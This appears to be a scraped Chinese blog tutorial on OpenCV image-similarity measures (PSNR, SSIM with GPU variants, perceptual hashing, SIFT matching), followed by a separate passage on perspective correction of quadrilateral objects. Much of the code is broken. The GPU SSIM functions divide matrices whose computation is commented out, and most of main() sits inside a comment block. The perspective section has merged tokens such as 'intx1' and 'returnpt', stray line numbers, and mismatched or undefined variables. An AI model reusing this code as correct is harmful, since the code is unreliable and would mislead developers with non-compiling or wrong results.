Scalar getMSSIM_GPU_optimized( const Mat& i1, const Mat& i2, BufferMSSIM& b);

void help()
{
	cout
		<< "\n--------------------------------------------------------------------------" << endl
		<< "This program shows how to port your CPU code to GPU or write that from scratch." << endl
		<< "You can see the performance improvement for the similarity check methods (PSNR and SSIM)."  << endl
		<< "Usage:"                                                               << endl
		<< "./gpu-basics-similarity referenceImage comparedImage numberOfTimesToRunTest(like 10)." << endl
		<< "--------------------------------------------------------------------------"   << endl
		<< endl;
}

int main(int argc, char *argv[])
{
	help(); 
	Mat I1 = imread("swan1.jpg",1);           // Read the two images
	Mat I2 = imread("swan2.jpg",1);

	if (!I1.data || !I2.data)           // Check for success
	{
		cout << "Couldn't read the image";
		return 0;
	}

	BufferPSNR bufferPSNR;
	BufferMSSIM bufferMSSIM;

	int TIMES; 
	stringstream sstr("500"); 
	sstr >> TIMES;
	double time, result;

	//------------------------------- PSNR CPU ----------------------------------------------------
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		result = getPSNR(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of PSNR CPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of: " <<  result << endl; 

	////------------------------------- PSNR GPU ----------------------------------------------------
	//time = (double)getTickCount();    

	//for (int i = 0; i < TIMES; ++i)
	//	result = getPSNR_GPU(I1,I2);

	//time = 1000*((double)getTickCount() - time)/getTickFrequency();
	//time /= TIMES;

	//cout << "Time of PSNR GPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
	//	<< " With result of: " <<  result << endl; 
/*
	//------------------------------- PSNR GPU Optimized--------------------------------------------
	time = (double)getTickCount();                                  // Initial call
	result = getPSNR_GPU_optimized(I1, I2, bufferPSNR);
	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	cout << "Initial call GPU optimized:              " << time  <<" milliseconds."
		<< " With result of: " << result << endl;

	time = (double)getTickCount();    
	for (int i = 0; i < TIMES; ++i)
		result = getPSNR_GPU_optimized(I1, I2, bufferPSNR);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of PSNR GPU OPTIMIZED ( / " << TIMES << " runs): " << time 
		<< " milliseconds." << " With result of: " <<  result << endl << endl; 


	//------------------------------- SSIM CPU -----------------------------------------------------
	Scalar x;
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM CPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	//------------------------------- SSIM GPU -----------------------------------------------------
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM_GPU(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM GPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	//------------------------------- SSIM GPU Optimized--------------------------------------------
	time = (double)getTickCount();    
	x = getMSSIM_GPU_optimized(I1,I2, bufferMSSIM);
	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	cout << "Time of MSSIM GPU Initial Call            " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM_GPU_optimized(I1,I2, bufferMSSIM);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM GPU OPTIMIZED ( / " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl << endl; 
	return 0;
	*/
	getchar();
}


double getPSNR(const Mat& I1, const Mat& I2)
{
	Mat s1; 
	absdiff(I1, I2, s1);       // |I1 - I2|
	s1.convertTo(s1, CV_32F);  // cannot make a square on 8 bits
	s1 = s1.mul(s1);           // |I1 - I2|^2

	Scalar s = sum(s1);         // sum elements per channel

	double sse = s.val[0] + s.val[1] + s.val[2]; // sum channels

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double  mse =sse /(double)(I1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}



double getPSNR_GPU_optimized(const Mat& I1, const Mat& I2, BufferPSNR& b)
{    
	b.gI1.upload(I1);
	b.gI2.upload(I2);

	b.gI1.convertTo(b.t1, CV_32F);
	b.gI2.convertTo(b.t2, CV_32F);

	gpu::absdiff(b.t1.reshape(1), b.t2.reshape(1), b.gs);
	gpu::multiply(b.gs, b.gs, b.gs);

	double sse = gpu::sum(b.gs, b.buf)[0];

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double mse = sse /(double)(I1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}

double getPSNR_GPU(const Mat& I1, const Mat& I2)
{
	gpu::GpuMat gI1, gI2, gs, t1,t2; 

	gI1.upload(I1);
	gI2.upload(I2);

	gI1.convertTo(t1, CV_32F);
	gI2.convertTo(t2, CV_32F);

	gpu::absdiff(t1.reshape(1), t2.reshape(1), gs); 
	gpu::multiply(gs, gs, gs);

	Scalar s = gpu::sum(gs);
	double sse = s.val[0] + s.val[1] + s.val[2];

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double  mse =sse /(double)(gI1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}

Scalar getMSSIM( const Mat& i1, const Mat& i2)
{ 
	const double C1 = 6.5025, C2 = 58.5225;
	/***************************** INITS **********************************/
	int d     = CV_32F;

	Mat I1, I2; 
	i1.convertTo(I1, d);           // cannot calculate on one byte large values
	i2.convertTo(I2, d); 

	Mat I2_2   = I2.mul(I2);        // I2^2
	Mat I1_2   = I1.mul(I1);        // I1^2
	Mat I1_I2  = I1.mul(I2);        // I1 * I2

	/*************************** END INITS **********************************/

	Mat mu1, mu2;   // PRELIMINARY COMPUTING
	GaussianBlur(I1, mu1, Size(11, 11), 1.5);
	GaussianBlur(I2, mu2, Size(11, 11), 1.5);

	Mat mu1_2   =   mu1.mul(mu1);    
	Mat mu2_2   =   mu2.mul(mu2); 
	Mat mu1_mu2 =   mu1.mul(mu2);

	Mat sigma1_2, sigma2_2, sigma12; 

	GaussianBlur(I1_2, sigma1_2, Size(11, 11), 1.5);
	sigma1_2 -= mu1_2;

	GaussianBlur(I2_2, sigma2_2, Size(11, 11), 1.5);
	sigma2_2 -= mu2_2;

	GaussianBlur(I1_I2, sigma12, Size(11, 11), 1.5);
	sigma12 -= mu1_mu2;

	///////////////////////////////// FORMULA ////////////////////////////////
	Mat t1, t2, t3; 

	t1 = 2 * mu1_mu2 + C1; 
	t2 = 2 * sigma12 + C2; 
	t3 = t1.mul(t2);              // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))

	t1 = mu1_2 + mu2_2 + C1; 
	t2 = sigma1_2 + sigma2_2 + C2;     
	t1 = t1.mul(t2);               // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))

	Mat ssim_map;
	divide(t3, t1, ssim_map);      // ssim_map =  t3./t1;

	Scalar mssim = mean( ssim_map ); // mssim = average of ssim map
	return mssim; 
}

Scalar getMSSIM_GPU( const Mat& i1, const Mat& i2)
{ 
	const float C1 = 6.5025f, C2 = 58.5225f;
	/***************************** INITS **********************************/
	gpu::GpuMat gI1, gI2, gs1, t1,t2; 

	gI1.upload(i1);
	gI2.upload(i2);

	gI1.convertTo(t1, CV_MAKE_TYPE(CV_32F, gI1.channels()));
	gI2.convertTo(t2, CV_MAKE_TYPE(CV_32F, gI2.channels()));

	vector<gpu::GpuMat> vI1, vI2; 
	gpu::split(t1, vI1);
	gpu::split(t2, vI2);
	Scalar mssim;

	for( int i = 0; i < gI1.channels(); ++i )
	{
		gpu::GpuMat I2_2, I1_2, I1_I2; 

		gpu::multiply(vI2[i], vI2[i], I2_2);        // I2^2
		gpu::multiply(vI1[i], vI1[i], I1_2);        // I1^2
		gpu::multiply(vI1[i], vI2[i], I1_I2);       // I1 * I2

		/*************************** END INITS **********************************/
		gpu::GpuMat mu1, mu2;   // PRELIMINARY COMPUTING
		gpu::GaussianBlur(vI1[i], mu1, Size(11, 11), 1.5);
		gpu::GaussianBlur(vI2[i], mu2, Size(11, 11), 1.5);

		gpu::GpuMat mu1_2, mu2_2, mu1_mu2; 
		gpu::multiply(mu1, mu1, mu1_2);   
		gpu::multiply(mu2, mu2, mu2_2);   
		gpu::multiply(mu1, mu2, mu1_mu2);   

		gpu::GpuMat sigma1_2, sigma2_2, sigma12; 

		gpu::GaussianBlur(I1_2, sigma1_2, Size(11, 11), 1.5);
		//sigma1_2 = sigma1_2 - mu1_2;
		gpu::subtract(sigma1_2,mu1_2,sigma1_2);

		gpu::GaussianBlur(I2_2, sigma2_2, Size(11, 11), 1.5);
		//sigma2_2 = sigma2_2 - mu2_2;

		gpu::GaussianBlur(I1_I2, sigma12, Size(11, 11), 1.5);
		(Mat)sigma12 =(Mat)sigma12 - (Mat)mu1_mu2;
		//sigma12 = sigma12 - mu1_mu2

		///////////////////////////////// FORMULA ////////////////////////////////
		gpu::GpuMat t1, t2, t3; 

// 		t1 = 2 * mu1_mu2 + C1; 
// 		t2 = 2 * sigma12 + C2; 
// 		gpu::multiply(t1, t2, t3);     // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))
// 
// 		t1 = mu1_2 + mu2_2 + C1; 
// 		t2 = sigma1_2 + sigma2_2 + C2;     
// 		gpu::multiply(t1, t2, t1);     // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))

		gpu::GpuMat ssim_map;
		gpu::divide(t3, t1, ssim_map);      // ssim_map =  t3./t1;

		Scalar s = gpu::sum(ssim_map);    
		mssim.val[i] = s.val[0] / (ssim_map.rows * ssim_map.cols);

	}
	return mssim; 
}

Scalar getMSSIM_GPU_optimized( const Mat& i1, const Mat& i2, BufferMSSIM& b)
{ 
	int cn = i1.channels();

	const float C1 = 6.5025f, C2 = 58.5225f;
	/***************************** INITS **********************************/

	b.gI1.upload(i1);
	b.gI2.upload(i2);

	gpu::Stream stream;

	stream.enqueueConvert(b.gI1, b.t1, CV_32F);
	stream.enqueueConvert(b.gI2, b.t2, CV_32F);      

	gpu::split(b.t1, b.vI1, stream);
	gpu::split(b.t2, b.vI2, stream);
	Scalar mssim;

	for( int i = 0; i < b.gI1.channels(); ++i )
	{        
		gpu::multiply(b.vI2[i], b.vI2[i], b.I2_2, stream);        // I2^2
		gpu::multiply(b.vI1[i], b.vI1[i], b.I1_2, stream);        // I1^2
		gpu::multiply(b.vI1[i], b.vI2[i], b.I1_I2, stream);       // I1 * I2

		//gpu::GaussianBlur(b.vI1[i], b.mu1, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::GaussianBlur(b.vI2[i], b.mu2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);

		gpu::multiply(b.mu1, b.mu1, b.mu1_2, stream);   
		gpu::multiply(b.mu2, b.mu2, b.mu2_2, stream);   
		gpu::multiply(b.mu1, b.mu2, b.mu1_mu2, stream);   

		//gpu::GaussianBlur(b.I1_2, b.sigma1_2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma1_2, b.mu1_2, b.sigma1_2, stream);
		//b.sigma1_2 -= b.mu1_2;  - This would result in an extra data transfer operation

		//gpu::GaussianBlur(b.I2_2, b.sigma2_2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma2_2, b.mu2_2, b.sigma2_2, stream);
		//b.sigma2_2 -= b.mu2_2;

		//gpu::GaussianBlur(b.I1_I2, b.sigma12, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma12, b.mu1_mu2, b.sigma12, stream);
		//b.sigma12 -= b.mu1_mu2;

		//here too it would be an extra data transfer due to call of operator*(Scalar, Mat)
		gpu::multiply(b.mu1_mu2, 2, b.t1, stream); //b.t1 = 2 * b.mu1_mu2 + C1; 
		//gpu::add(b.t1, C1, b.t1, stream);
		gpu::multiply(b.sigma12, 2, b.t2, stream); //b.t2 = 2 * b.sigma12 + C2; 
		//gpu::add(b.t2, C2, b.t2, stream);     

		gpu::multiply(b.t1, b.t2, b.t3, stream);     // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))

		//gpu::add(b.mu1_2, b.mu2_2, b.t1, stream);
		//gpu::add(b.t1, C1, b.t1, stream);

		//gpu::add(b.sigma1_2, b.sigma2_2, b.t2, stream);
		//gpu::add(b.t2, C2, b.t2, stream);


		gpu::multiply(b.t1, b.t2, b.t1, stream);     // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))        
		gpu::divide(b.t3, b.t1, b.ssim_map, stream);      // ssim_map =  t3./t1;

		stream.waitForCompletion();

		Scalar s = gpu::sum(b.ssim_map, b.buf);    
		mssim.val[i] = s.val[0] / (b.ssim_map.rows * b.ssim_map.cols);

	}
	return mssim; 
}

效果
两幅一样的图片，对比结果：



2.感知哈希算法
(perceptual hash algorithm）
http://blog.csdn.net/fengbingchun/article/details/42153261
感知哈希算法(perceptual hash algorithm)，它的作用是对每张图像生成一个“指纹”(fingerprint)字符串，然后比较不同图像的指纹。结果越接近，就说明图像越相似。
实现步骤


缩小尺寸：将图像缩小到8*8的尺寸，总共64个像素。


这一步的作用是去除图像的细节，只保留结构/明暗等基本信息，摒弃不同尺寸/比例带来的图像差异；这一步的作用是去除图像的细节，只保留结构/明暗等基本信息，摒弃不同尺寸/比例带来的图像差异；


简化色彩：将缩小后的图像，转为64级灰度，即所有像素点总共只有64种颜色；


计算平均值：计算所有64个像素的灰度平均值；


比较像素的灰度：将每个像素的灰度，与平均值进行比较，大于或等于平均值记为1，小于平均值记为0；


计算哈希值：将上一步的比较结果，组合在一起，就构成了一个64位的整数，这就是这张图像的指纹。组合的次序并不重要，只要保证所有图像都采用同样次序就行了；


得到指纹以后，就可以对比不同的图像，看看64位中有多少位是不一样的。在理论上，这等同于”汉明距离”(Hamming distance,在信息论中，两个等长字符串之间的汉明距离是两个字符串对应位置的不同字符的个数)。


如果不相同的数据位数不超过5，就说明两张图像很相似；
如果大于10，就说明这是两张不同的图像。
以上内容摘自：http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html
代码
// similarity.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>

#pragma comment(lib,"opencv_core2410d.lib")          
#pragma comment(lib,"opencv_highgui2410d.lib")          
#pragma comment(lib,"opencv_imgproc2410d.lib")    


using namespace std;


int _tmain(int argc, _TCHAR* argv[])
{

	string strSrcImageName = "swan.jpg";

	cv::Mat matSrc, matSrc1, matSrc2;

	matSrc = cv::imread(strSrcImageName, CV_LOAD_IMAGE_COLOR);
	CV_Assert(matSrc.channels() == 3);

	cv::resize(matSrc, matSrc1, cv::Size(357, 419), 0, 0, cv::INTER_NEAREST);
	//cv::flip(matSrc1, matSrc1, 1);
	cv::resize(matSrc, matSrc2, cv::Size(2177, 3233), 0, 0, cv::INTER_LANCZOS4);

	cv::Mat matDst1, matDst2;

	cv::resize(matSrc1, matDst1, cv::Size(8, 8), 0, 0, cv::INTER_CUBIC);
	cv::resize(matSrc2, matDst2, cv::Size(8, 8), 0, 0, cv::INTER_CUBIC);
	//update 20181206 for the bug cvtColor
	cv::Mat temp1 = matDst1;
	cv::Mat temp2 = matDst2;
	cv::cvtColor(temp1 , matDst1, CV_BGR2GRAY);
	cv::cvtColor(temp2 , matDst2, CV_BGR2GRAY);

	int iAvg1 = 0, iAvg2 = 0;
	int arr1[64], arr2[64];

	for (int i = 0; i < 8; i++)
	{
		uchar* data1 = matDst1.ptr<uchar>(i);
		uchar* data2 = matDst2.ptr<uchar>(i);

		int tmp = i * 8;

		for (int j = 0; j < 8; j++) 
		{
			int tmp1 = tmp + j;

			arr1[tmp1] = data1[j] / 4 * 4;
			arr2[tmp1] = data2[j] / 4 * 4;

			iAvg1 += arr1[tmp1];
			iAvg2 += arr2[tmp1];
		}
	}

	iAvg1 /= 64;
	iAvg2 /= 64;

	for (int i = 0; i < 64; i++) 
	{
		arr1[i] = (arr1[i] >= iAvg1) ? 1 : 0;
		arr2[i] = (arr2[i] >= iAvg2) ? 1 : 0;
	}

	int iDiffNum = 0;

	for (int i = 0; i < 64; i++)
		if (arr1[i] != arr2[i])
			++iDiffNum;

	cout<<"iDiffNum = "<<iDiffNum<<endl;

	if (iDiffNum <= 5)
		cout<<"two images are very similar!"<<endl;
	else if (iDiffNum > 10)
		cout<<"they are two different images!"<<endl;
	else
		cout<<"two image are somewhat similar!"<<endl;

	getchar();
	return 0;
}



效果
一幅图片自己对比：

结果：


3.计算特征点
OpenCV的feature2d module中提供了从局部图像特征（Local image feature）的检测、特征向量（feature vector）的提取，到特征匹配的实现。其中的局部图像特征包括了常用的几种局部图像特征检测与描述算子，如FAST、SURF、SIFT、以及ORB。对于高维特征向量之间的匹配，OpenCV主要有两种方式：
1）BruteForce穷举法；
2）FLANN近似K近邻算法（包含了多种高维特征向量匹配的算法，例如随机森林等）。
feature2d module： http://docs.opencv.org/modules/features2d/doc/features2d.html
OpenCV FLANN: http://docs.opencv.org/modules/flann/doc/flann.html
FLANN: http://www.cs.ubc.ca/~mariusm/index.php/FLANN/FLANN
原文：
http://blog.csdn.net/icvpr/article/details/8491369
代码
//localfeature.h
#ifndef _FEATURE_H_ 
#define _FEATURE_H_

#include <iostream>
#include <vector>
#include <string>

#include <opencv2/opencv.hpp>
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/nonfree/nonfree.hpp>  
#include <opencv2/nonfree/features2d.hpp>  
using namespace cv;
using namespace std;

class Feature
{
public:
	Feature();
	~Feature();

	Feature(const string& detectType, const string& extractType, const string& matchType);

public:

	void detectKeypoints(const Mat& image, vector<KeyPoint>& keypoints);  // 检测特征点
	void extractDescriptors(const Mat& image, vector<KeyPoint>& keypoints, Mat& descriptor);  // 提取特征向量
	void bestMatch(const Mat& queryDescriptor, Mat& trainDescriptor, vector<DMatch>& matches);  // 最近邻匹配
	void knnMatch(const Mat& queryDescriptor, Mat& trainDescriptor, vector<vector<DMatch>>& matches, int k);  // K近邻匹配

	void saveKeypoints(const Mat& image, const vector<KeyPoint>& keypoints, const string& saveFileName = "");  // 保存特征点
	void saveMatches(const Mat& queryImage,
		const vector<KeyPoint>& queryKeypoints,
		const Mat& trainImage,
		const vector<KeyPoint>& trainKeypoints,
		const vector<DMatch>& matches,
		const string& saveFileName = "");  // 保存匹配结果到图片中

private:
	Ptr<FeatureDetector> m_detector;
	Ptr<DescriptorExtractor> m_extractor;
	Ptr<DescriptorMatcher> m_matcher;

	string m_detectType;
	string m_extractType;
	string m_matchType;

};


#endif

//localfeature.cpp

#include "stdafx.h"
#include "localfeature.h"


Feature::Feature()
{
	m_detectType = "SIFT";
	m_extractType = "SIFT";
	m_matchType = "BruteForce";
}

Feature::~Feature()
{

}


Feature::Feature(const string& detectType, const string& extractType, const string& matchType)
{
	assert(!detectType.empty());
	assert(!extractType.empty());
	assert(!matchType.empty());

	m_detectType = detectType;
	m_extractType = extractType;
	m_matchType = matchType;
}


void Feature::detectKeypoints(const Mat& image, std::vector<KeyPoint>& keypoints) 
{
	assert(image.type() == CV_8UC1);
	assert(!m_detectType.empty());

	keypoints.clear();

	initModule_nonfree();

	m_detector = FeatureDetector::create(m_detectType);
	m_detector->detect(image, keypoints);

}



void Feature::extractDescriptors(const Mat& image, std::vector<KeyPoint>& keypoints, Mat& descriptor)
{
	assert(image.type() == CV_8UC1);
	assert(!m_extractType.empty());

	initModule_nonfree(); 
	m_extractor = DescriptorExtractor::create(m_extractType);
	m_extractor->compute(image, keypoints, descriptor);

}


void Feature::bestMatch(const Mat& queryDescriptor, Mat& trainDescriptor, std::vector<DMatch>& matches) 
{
	assert(!queryDescriptor.empty());
	assert(!trainDescriptor.empty());
	assert(!m_matchType.empty());

	matches.clear();

	m_matcher = DescriptorMatcher::create(m_matchType);
	m_matcher->add(std::vector<Mat>(1, trainDescriptor));
	m_matcher->train();
	m_matcher->match(queryDescriptor, matches);

}


void Feature::knnMatch(const Mat& queryDescriptor, Mat& trainDescriptor, std::vector<std::vector<DMatch>>& matches, int k)
{
	assert(k > 0);
	assert(!queryDescriptor.empty());
	assert(!trainDescriptor.empty());
	assert(!m_matchType.empty());

	matches.clear();

	m_matcher = DescriptorMatcher::create(m_matchType);
	m_matcher->add(std::vector<Mat>(1, trainDescriptor));
	m_matcher->train();
	m_matcher->knnMatch(queryDescriptor, matches, k);

}



void Feature::saveKeypoints(const Mat& image, const vector<KeyPoint>& keypoints, const string& saveFileName)
{
	assert(!saveFileName.empty());

	Mat outImage;
	cv::drawKeypoints(image, keypoints, outImage, Scalar(255,255,0), DrawMatchesFlags::DRAW_RICH_KEYPOINTS );

	//
	string saveKeypointsImgName = saveFileName + "_" + m_detectType + ".jpg";
	imwrite(saveKeypointsImgName, outImage);

}



void Feature::saveMatches(const Mat& queryImage,
	const vector<KeyPoint>& queryKeypoints,
	const Mat& trainImage,
	const vector<KeyPoint>& trainKeypoints,
	const vector<DMatch>& matches,
	const string& saveFileName)
{
	assert(!saveFileName.empty());

	Mat outImage;
	cv::drawMatches(queryImage, queryKeypoints, trainImage, trainKeypoints, matches, outImage, 
		Scalar(255, 0, 0), Scalar(0, 255, 255), vector<char>(),  DrawMatchesFlags::NOT_DRAW_SINGLE_POINTS);

	//
	string saveMatchImgName = saveFileName + "_" + m_detectType + "_" + m_extractType + "_" + m_matchType + ".jpg";
	imwrite(saveMatchImgName, outImage);
}



// main.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/nonfree/nonfree.hpp>  
#include <opencv2/nonfree/features2d.hpp>  

#include "localfeature.h"

#pragma comment(lib,"opencv_core2410d.lib")          
#pragma comment(lib,"opencv_highgui2410d.lib")          
#pragma comment(lib,"opencv_imgproc2410d.lib") 
#pragma comment(lib,"opencv_nonfree2410d.lib")    
#pragma comment(lib,"opencv_features2d2410d.lib")    


using namespace std;





int main(int argc, char** argv)
{
	/*if (argc != 6)
	{
		cout << "wrong usage!" << endl;
		cout << "usage: .exe FAST SIFT BruteForce queryImage trainImage" << endl;
		return -1;
	}*/

	string detectorType = "SIFT";
	string extractorType = "SIFT";
	string matchType = "BruteForce";
	string queryImagePath = "swan.jpg";
	string trainImagePath = "swan.jpg";


	Mat queryImage = imread(queryImagePath, CV_LOAD_IMAGE_GRAYSCALE);
	if (queryImage.empty())
	{
		cout<<"read failed"<< endl;
		return -1;
	}

	Mat trainImage = imread(trainImagePath, CV_LOAD_IMAGE_GRAYSCALE);
	if (trainImage.empty())
	{
		cout<<"read failed"<< endl;
		return -1;
	}


	Feature feature(detectorType, extractorType, matchType);

	vector<KeyPoint> queryKeypoints, trainKeypoints; 
	feature.detectKeypoints(queryImage, queryKeypoints);
	feature.detectKeypoints(trainImage, trainKeypoints);


	Mat queryDescriptor, trainDescriptor;


	feature.extractDescriptors(queryImage, queryKeypoints, queryDescriptor);
	feature.extractDescriptors(trainImage, trainKeypoints, trainDescriptor);


	vector<DMatch> matches;
	feature.bestMatch(queryDescriptor, trainDescriptor, matches);

	vector<vector<DMatch>> knnmatches;
	feature.knnMatch(queryDescriptor, trainDescriptor, knnmatches, 2);

	Mat outImage;
	feature.saveMatches(queryImage, queryKeypoints, trainImage, trainKeypoints, matches, "../");


	return 0;
}



效果
两幅同样图片结果：

几年前上学时候写了这个文章，没想到现在居然是博客访问最高的一篇文章，现在我又收集了一些论文文档资料，当然衡量图像相似度的方法有很多不止上述的三种方法，具体我们再看看论文和外围资料，下载链接：
http://download.csdn.net/detail/wangyaninglm/9764301

更新
参照大牛@yuanwenmao，大家可能得对部分代码做出修改
cv::cvtColor(matDst1, matDst1, CV_BGR2GRAY);
cv::cvtColor(matDst2, matDst2, CV_BGR2GRAY);

感知哈希算法，的这里有个bug，入参与出参不能是同一个变量，内部应该在计算时被自己修改了，造成判断结果都是很相似。由于博主采用了同一个图片进行比较，所以没发现问题。
void cv::cvtColor(
cv::InputArray src, // 输入序列
cv::OutputArray dst, // 输出序列
int code, // 颜色映射码
int dstCn = 0 // 输出的通道数 (0='automatic')
);

你src、dst都传同一个array，内部计算的同时又在修改array的值，自然有问题。可以看看cvtColor的实现。dst换用另外的变量即可，后面的计算也以更换的变量来。

转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/51533549，
来自：
shiter编写程序的艺术








 
参考文献：
http://www.cnblogs.com/self-control/archive/2013/01/18/2867022.html
http://opencv-code.com/tutorials/automatic-perspective-correction-for-quadrilateral-objects/ 
 
透视变换：
http://blog.csdn.net/xiaowei_cqu/article/details/26478135
 
 
具体流程为：
a)载入图像→灰度化→边缘处理得到边缘图像（edge map）
cv::Mat im = cv::imread(filename);
cv::Mat gray;
cvtColor(im,gray,CV_BGR2GRAY);
Canny(gray,gray,100,150,3);
 
b)霍夫变换进行直线检测，此处使用的是probabilistic Hough transform（cv::HoughLinesP）而不是standard Hough transform（cv::HoughLines）
std::vector<Vec4i> lines;
cv::HoughLinesP(gray,lines,1,CV_PI/180,70,30,10);
for(int i = 0; i < lines.size(); i++)
    line(im,cv::Point(lines[i][0],lines[i][1]),cv::Point(lines[i][2],lines[i][3]),Scalar(255,0,0),2,8,0);

 
c)通过上面的图我们可以看出，通过霍夫变换检测到的直线并没有将整个边缘包含，但是我们要求的是四个顶点所以并不一定要直线真正的相交，下面就要求四个顶点的坐标，公式为：

 



?

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16



cv::Point2f computeIntersect(cv::Vec4i a, cv::Vec4i b)
{
    intx1 = a[0], y1 = a[1], x2 = a[2], y2 = a[3];
    intx3 = b[0], y3 = b[1], x4 = b[2], y4 = b[3];
 
    if(floatd = ((float)(x1-x2)
 * (y3-y4)) - ((y1-y2) * (x3-x4)))
    {
        cv::Point2f pt;
        pt.x = ((x1*y2 - y1*x2) * (x3-x4) - (x1-x2) * (x3*y4 - y3*x4)) / d;
        pt.y = ((x1*y2 - y1*x2) * (y3-y4) - (y1-y2) * (x3*y4 - y3*x4)) / d;
        returnpt;
    }
    else
        returncv::Point2f(-1, -1);
}
　　





　　



?

1
2
3
4
5
6
7
8
9
10



std::vector<cv::Point2f> corners;
for 
(int i = 0; i < lines.size(); i++)
{
    for(intj = i+1; j < lines.size(); j++)
    {
        cv::Point2f pt = computeIntersect(lines[i], lines[j]);
        if(pt.x >= 0 && pt.y >= 0)
            corners.push_back(pt);
    }
}







 
d）检查是不是四边形




?

1
2
3
4
5
6
7
8
9



std::vector<cv::Point2f> approx;
cv::approxPolyDP(cv::Mat(corners), approx,
                 cv::arcLength(cv::Mat(corners),true) * 0.02,true);
 
if 
(approx.size() != 4)
{
    std::cout <<"The object is not quadrilateral!"<< std::endl;
    return-1;
}





　　

 
e)确定四个顶点的具体位置（top-left, bottom-left, top-right, and bottom-right corner）→通过四个顶点求出映射矩阵来.




?


void 
sortCorners(std::vector<cv::Point2f>& corners, cv::Point2f center)
{
    std::vector<cv::Point2f> top, bot;
 
    for(inti = 0; i < corners.size(); i++)
    {
        if(corners[i].y < center.y)
            top.push_back(corners[i]);
        else
            bot.push_back(corners[i]);
    }
 
    cv::Point2f tl = top[0].x > top[1].x ? top[1] : top[0];
    cv::Point2f tr = top[0].x > top[1].x ? top[0] : top[1];
    cv::Point2f bl = bot[0].x > bot[1].x ? bot[1] : bot[0];
    cv::Point2f br = bot[0].x > bot[1].x ? bot[0] : bot[1];
 
    corners.clear();
    corners.push_back(tl);
    corners.push_back(tr);
    corners.push_back(br);
    corners.push_back(bl);
}





　下面是获得中心点坐标然后利用上面的函数确定四个顶点的坐标



?


for 
(int i = 0; i < corners.size(); i++)
    center += corners[i];
 
center *= (1. / corners.size());
sortCorners(corners, center);





　定义目的图像并初始化为0



?


cv::Mat quad = cv::Mat::zeros(300, 220, CV_8UC3);





　获取目的图像的四个顶点



?


std::vector<cv::Point2f> dst_pt;
dst.push_back(cv::Point2f(0,0));
dst.push_back(cv::Point2f(quad.cols,0));
dst.push_back(cv::Point2f(quad.cols,quad.rows));
dst.push_back(cv::Point2f(0,quad.rows));





　计算映射矩阵



?


cv::Mat transmtx = cv::getPerspectiveTransform(corners, quad_pts);





进行透视变换并显示结果



?


cv::warpPerspective(im, quad, transmtx, quad.size());
cv::imshow("quadrilateral", quad);





　　
　

 
 
 
 
 
 
 
 
 
 
 
 
// affine transformation.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

/**
 * Automatic perspective correction for quadrilateral objects. See the tutorial at
 * http://opencv-code.com/tutorials/automatic-perspective-correction-for-quadrilateral-objects/
 */
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <iostream>

#pragma comment(lib,"opencv_core2410d.lib")          
#pragma comment(lib,"opencv_highgui2410d.lib")          
#pragma comment(lib,"opencv_imgproc2410d.lib")    



